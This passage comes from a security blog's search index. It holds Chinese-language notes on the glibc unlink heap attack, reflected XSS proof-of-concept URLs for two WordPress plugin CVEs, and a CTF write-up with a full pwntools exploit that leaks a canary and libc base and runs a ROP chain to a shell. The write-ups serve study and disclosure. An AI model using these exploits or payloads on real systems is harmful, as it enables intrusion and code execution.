src="https://i.imgur.com/08lqalM.png"></p><p>因此利用步骤为：</p><ol><li>申请chunk，低第2字节对齐</li><li>设置fake chunk，p-&gt;fd&#x3D;a，p-&gt;bk&#x3D;b, p.size&#x3D;0x501</li><li>设置b-&gt;fd&#x3D;p</li><li>设置a-&gt;bk&#x3D;p</li><li>伪造prev_size和prev_inuse</li><li>free触发合并</li></ol><p>文章中也提到了可以通过后向或者前向合并来保留unsortedbin中的fd指针，可以通过在合并后地chunk里地原size部位写，这样\00字节就写入到了fd中，因此需要确保p的低2位为00。<br><img src="https://i.imgur.com/J2n2NaO.png"><br>比如通过合并H0和D保留了D中的fd指针，然后申请一个H1，在0x431的部分再重新写入0x431这样多余的00就会将本来指向c1的fd改为了指向c0。<code>add(6,0x500-8, &#39;6&#39;*0x488 + p64(0x431))</code></p>]]></content>
    
    
    <categories>
      
      <category>how2heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/06/21/unlink/"/>
    <url>/2022/06/21/unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="释放堆"><a href="#释放堆" class="headerlink" title="释放堆"></a>释放堆</h2><p>释放堆时会检查相邻地址的chunk是否处于空闲状态，若是就会合并这两个chunk。合并时会进行unlink操作，将相邻地址的chunk进行unlink解链操作从bins中拿出来。</p><p><strong>堆合并分为向前合并和向后合并。</strong></p><ul><li>向后合并指的是在释放P时和他的pre_chunk合并（也就是相邻小地址的chunk）</li><li>向前合并指的是在释放P时和他的next_chunk合并（也就是相邻大地址的chunk）</li></ul><h2 id="Unlink的流程"><a href="#Unlink的流程" class="headerlink" title="Unlink的流程"></a>Unlink的流程</h2><figure class="highlight xl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><pre><code class="hljs xl">#define unlink(AV, P, BK, FD) &#123;<br>            <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))<br>              malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>            FD = P-&gt;fd;<br>            BK = P-&gt;bk;<br>            <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (FD-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || BK-&gt;</span>fd != P, <span class="hljs-number">0</span>))<br>              malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br>            <span class="hljs-keyword">else</span> &#123;<br>                FD-&gt;bk = BK;<br>                BK-&gt;fd = FD;<br>                <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))<br>                    &amp;&amp; __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span>fd_nextsize != NULL, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize != P, <span class="hljs-number">0</span>)<br>                        || __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize != P, <span class="hljs-number">0</span>))<br>                      malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (FD-&gt;</span>fd_nextsize == NULL) &#123;<br>                        <span class="hljs-function"><span class="hljs-title">if</span> (P-&gt;</span>fd_nextsize == P)<br>                          FD-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = FD-&gt;</span>bk_nextsize = FD;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            FD-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;<br>                            FD-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;<br>                            P-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize = FD;<br>                            P-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize = FD;<br>                          &#125;<br>                      &#125; <span class="hljs-keyword">else</span> &#123;<br>                        P-&gt;<span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = P-&gt;</span>bk_nextsize;<br>                        P-&gt;<span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = P-&gt;</span>fd_nextsize;<br>                      &#125;                         &#125;<br>              &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>(代码来源于<a href="https://lantern.cool/note-pwn-unlink/">这里</a>)<br>首先会检查当前chunk的大小是否和相邻next_chunk的pre_size的大小进行比较。然后会检查<code>FD-&gt;bk == P || BK-&gt;fd == P</code>。</p><p>因此想要执行unlink攻击，需要设置fake free chunk的size字段和相邻next_chunk的pre_size大小相同。并且需要设置<code>P-&gt;fd = ptr - 0x18</code> <code>P-&gt;bk = ptr - 0x10</code>来绕过第二个检查。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">FD</span> <span class="hljs-operator">=</span> P-&gt;fd <span class="hljs-operator">=</span> ptr - <span class="hljs-number">0</span>x18<br><span class="hljs-attribute">BK</span> <span class="hljs-operator">=</span> P-&gt;bk <span class="hljs-operator">=</span> ptr - <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/2o2ecAL.png"></p><p>因此</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BK</span>-&gt;fd = ptr - <span class="hljs-number">0</span>x10 + <span class="hljs-number">0</span>x10 = ptr<br><span class="hljs-attribute">FD</span>-&gt;bk = ptr - <span class="hljs-number">0</span>x18 + <span class="hljs-number">0</span>x18 = ptr<br></code></pre></td></tr></table></figure><p>可绕过检查。<br>解链后，<code>FD-&gt;bk = BK</code>即<code>*ptr = ptr - 0x10</code>, <code>BK-&gt;fd=FD</code>即<code>*ptr = ptr - 0x18</code>。</p><p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0x18 + free@got</code>, 使得 ptr 指向 <code>free@got</code>, 再次对 ptr 指向的内存进行写入，可以把 <code>free@got</code> 修改为 <code>system</code> 的地址，之后调用 <code>free</code> 可任意命令执行。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里用到的例子是<a href="https://github.com/shellphish/how2heap">how2heap</a>中的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c">unsafe_unlink</a></p><p>首先<code>gcc unsafe_unlink.c -o unsafe_unlink -g</code>编译，然后gdb调试。<br>chunk0_ptr是全局指针变量，在这里是为了伪造和chunk1_ptr相邻且已经free的chunk，因此在<code>free(chunk1_ptr)</code>时就会触发fake chunk的unlink操作。</p><p><img src="https://i.imgur.com/fvLIQxT.png"><br>这段代码是为了伪造fake chunk，绕过上面提到的检查。</p><p><img src="https://i.imgur.com/9rm9aI8.png"><br>这段代码是为了修改chunk1_ptr的chunk头部来使chunk1的prev_size字段值等于fake chunk的大小并且prev_inuse字段为0来使fake chunk为空闲状态。</p><p>我们用gdb调试，可以看到chunk0和chunk1两个chunk<br><img src="https://i.imgur.com/hIs2t6A.png"></p><p>然后填充chunk0中的fake chunk<br><img src="https://i.imgur.com/jYVFTsy.png"></p><p>然后伪造chunk1的prev_size位和prev_inuse位<br><img src="https://i.imgur.com/g4d4e2s.png"><br>之后<code>free(chunk1_ptr)</code>就会使fake chunk触发unlink操作，使得chunk0_ptr指针指向<em>chunk0_ptr[2]，也就是&amp;chunk0_ptr - 0x18<br><img src="https://i.imgur.com/fxmSrmF.png"><br>此时让chunk0_ptr[3] &#x3D; victim_string，也就是</em>（chunk0_ptr + 0x18） &#x3D; *(&amp;chunk0_ptr - 0x18 + 0x18) &#x3D; chunk0_ptr &#x3D; victim_string<br><img src="https://i.imgur.com/vvmINxX.png"><br>可能画个图好理解一点</p><p><img src="https://i.imgur.com/bn72gva.png"></p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>在这里说一下为什么chunk0_ptr[2]要填&amp;chunk0_ptr-0x18，前面为什么要加取址符？<br>是因为在检查时，会检查<code>FD-&gt;bk == P</code>,即*((p-&gt;fd)+0x18)&#x3D;&#x3D;p，也就是FD指针+0x18的位置所填的内容应该是p,如果chunk0_ptr[2]也就是p-&gt;fd填的是p-0x18的话，左边&#x3D;p!&#x3D;p&#x3D;右边,所以这里需要填的应该是&amp;chunk0_ptr-0x18</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lantern.cool/note-pwn-unlink/">Unlink</a></p>]]></content>
    
    
    <categories>
      
      <category>how2heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wp_check_email</title>
    <link href="/2022/04/22/wp-check-email/"/>
    <url>/2022/04/22/wp-check-email/</url>
    
    <content type="html"><![CDATA[<h1 id="Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS（CVE-2022-1547）"><a href="#Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS（CVE-2022-1547）" class="headerlink" title="Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS（CVE-2022-1547）"></a>Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS（CVE-2022-1547）</h1><p>In file <code>check-email\include\Core\UI\Page\Check_Email_Settings_Page.php</code> <code>$_GET[&#39;tab&#39;]</code>does not sanitized and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-check-email/1.png"></p><p>POC:</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=check-email-settings&amp;tab=<span class="hljs-string">&quot;&gt; &lt;input type=&quot;</span>text<span class="hljs-string">&quot; name=&quot;</span>test<span class="hljs-string">&quot; value=&quot;</span>xxxxx<span class="hljs-string">&quot; onmouseover=alert(1) test=&quot;</span><span class="hljs-string">&quot;/</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-check-email/2.png"></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wp_call_now_button</title>
    <link href="/2022/04/22/wp-call-now-button/"/>
    <url>/2022/04/22/wp-call-now-button/</url>
    
    <content type="html"><![CDATA[<h1 id="call-now-button-lt-x3D-1-1-1-Reflected-XSS（CVE-2022-1455）"><a href="#call-now-button-lt-x3D-1-1-1-Reflected-XSS（CVE-2022-1455）" class="headerlink" title="call now button &lt;&#x3D; 1.1.1 Reflected XSS（CVE-2022-1455）"></a>call now button &lt;&#x3D; 1.1.1 Reflected XSS（CVE-2022-1455）</h1><p>In file <code>/call-now-button/src/admin/action/CnbActionViewEdit.php</code> <code>$_REQUEST[&quot;bid&quot;]</code>does not sanitized properly and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-call-now-button/1.png"></p><p>And <code>$button-&gt;type = &#39;SINGLE&#39; </code>defaultly.</p><p><img src="/2022/04/22/wp-call-now-button/2.png"></p><p>If we want to trigger this xss, we need activate premium first, it’s for free.</p><p><img src="/2022/04/22/wp-call-now-button/3.png"> </p><p>POC:</p><p>According to <a href="https://portswigger.net/research/xss-in-hidden-input-fields">this article</a>, To trigger this xss we need press Shift + Alt + X in windows or Ctrl + Alt + X In macos.</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=call-now-button&amp;bid=xxxxx<span class="hljs-string">&quot; accesskey=X onclick=alert(1) test=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-call-now-button/4.png"></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022虎符babygame</title>
    <link href="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/"/>
    <url>/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/</url>
    
    <content type="html"><![CDATA[<p>比赛中没写出来，照着别人的wp复现了一下，记录下一些知识点。</p><p>题目还算是常规的那种，可以很明显看到漏洞是栈溢出和格式化字符串漏洞。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-04_224726.png"></p><p>首先是栈溢出为猜数游戏设置种子，并且泄露出canary的值。<br>然后通过猜数游戏（CDLL库可自行百度），进入13E7函数，</p><p>格式化字符串泄露出libcbase和elfbase，并且将ret addr改为sub_13E7函数，重新进入sub_13E7函数。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_173926.png"></p><p>此时将ret addr改为main函数，再用利用main函数中的栈溢出漏洞写入rop链，最后拿到shell。</p><p>rop链要加ret的原因是栈未对齐<br><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_174749.png"></p><p>可以看到，红框的语句的作用是检查rsp+0x50是否是0x10的倍数，显然不是，因此要加ret。</p><p>EXP：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> ctypes import cdll, CDLL<br><br><br><span class="hljs-attribute">context</span>.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-attribute">p</span> = process(&#x27;./babygame&#x27;)<br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><br><span class="hljs-attribute">base</span> = p.libs()[<span class="hljs-string">&quot;/hufu/babygame/37ae6078e4e24dcc8196e39efbe8c0bc/37ae6078e4e24dcc8196e39efbe8c0bc/babygame&quot;</span>]<br><br><span class="hljs-attribute">cmd</span> = <span class="hljs-string">&quot;b *%d\n&quot;</span> %(base+<span class="hljs-number">0</span>x1449)<br><span class="hljs-attribute">gdb</span>.attach(p, cmd)<br><br><br><span class="hljs-attribute">name</span> = b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x100+p64(<span class="hljs-number">0</span>x6161616161616161)+b<span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, name)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">9</span>)<br><br><span class="hljs-attribute">canary</span> = u64(b<span class="hljs-string">&quot;\x00&quot;</span>+p.recv(<span class="hljs-number">7</span>))<br><br><span class="hljs-attribute">rbp</span> = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-comment">#print(hex(canary))</span><br><br><span class="hljs-comment">#success(hex(canary))</span><br><span class="hljs-comment">#success(hex(rbp))</span><br><br><span class="hljs-attribute">libc</span> = CDLL(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>)<br><span class="hljs-attribute">libc</span>.srand(<span class="hljs-number">0</span>x6161616161616161)<br><br><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">100</span>):<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot; \n&quot;</span>, str((libc.rand()+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>))<br><br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-attribute">payload</span> = b<span class="hljs-string">&quot;%62c%9$hhn&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;q%79$p&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;ff%83$pl&quot;</span><br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;q&quot;</span>)<br><span class="hljs-attribute">leak</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br><span class="hljs-attribute">libc_base</span>= leak - <span class="hljs-number">0</span>x240b3<br><span class="hljs-comment">#success(hex(leak))</span><br><span class="hljs-comment">#success(hex(libc_base))</span><br><br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;ff&quot;</span>)<br><span class="hljs-attribute">elf_base</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x1465<br><span class="hljs-comment">#success(hex(elf_base))</span><br><br><span class="hljs-attribute">target</span> = (elf_base+<span class="hljs-number">0</span>x148e)&amp;<span class="hljs-number">0</span>xffff<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;%&#123;&#125;c%9$hn&quot;</span>.format(target).encode()<br><span class="hljs-attribute">payload</span> = payload.ljust(<span class="hljs-number">0</span>x10, b&#x27;a&#x27;)<br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">payload2</span> = b&#x27;q&#x27;*<span class="hljs-number">0</span>x108+p64(canary)+b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x18<br><br><span class="hljs-attribute">pop_rdi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000023b72<br><span class="hljs-attribute">bin_sh</span> = libc_base + <span class="hljs-number">0</span>x1b45bd<br><span class="hljs-attribute">system_addr</span> = libc_base + <span class="hljs-number">0</span>x522c0<br><span class="hljs-attribute">ret</span> = elf_base + <span class="hljs-number">0</span>x1565<br><br><span class="hljs-attribute">payload2</span> += p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system_addr)<br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, payload2)<br><br><span class="hljs-attribute">p</span>.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
